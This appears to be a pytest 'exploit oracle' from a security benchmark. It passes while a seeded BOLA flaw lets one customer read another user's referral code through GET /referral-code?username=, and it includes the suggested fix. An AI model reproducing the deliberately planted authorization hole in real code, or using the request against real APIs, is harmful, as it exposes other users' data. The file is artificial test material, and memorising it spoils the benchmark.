# AVE-seeded exploit oracle (added 2026-08-29, planning ticket 04).
# Instance I-07 — BOLA on GET /referral-code?username= (seeded diff in
# apis/referrals/service.py). INVERTED POLARITY: PASSES while vulnerable, FAILS
# once the endpoint ignores the parameter and binds to current_user. Not
# auto-collected — invoke by path. See target/CATALOG.md.
from db.models import User, UserRole


def test_bola_cross_customer_referral_code_read(test_db, customer_client):
    """
    Note:
        GET /referral-code accepts an optional `username` query parameter and
        returns that user's referral code instead of the caller's. Any customer can
        read another user's referral code — again a missing ownership predicate,
        not a missing role check.

    Possible fix:
        Resolve the referral code only for current_user; ignore `username`.
    """
    victim = User(
        id=99,
        username="victim",
        password="x",
        first_name="Victim",
        last_name="",
        phone_number="999",
        role=UserRole.CUSTOMER,
        referral_code="VICTIM01",
    )
    test_db.add(victim)
    test_db.commit()

    # caller is the fixture customer (id=3), reading victim's referral code
    response = customer_client.get("/referral-code?username=victim")
    assert response.status_code == 200
    assert response.json()["code"] == "VICTIM01"  # leaked another user's code
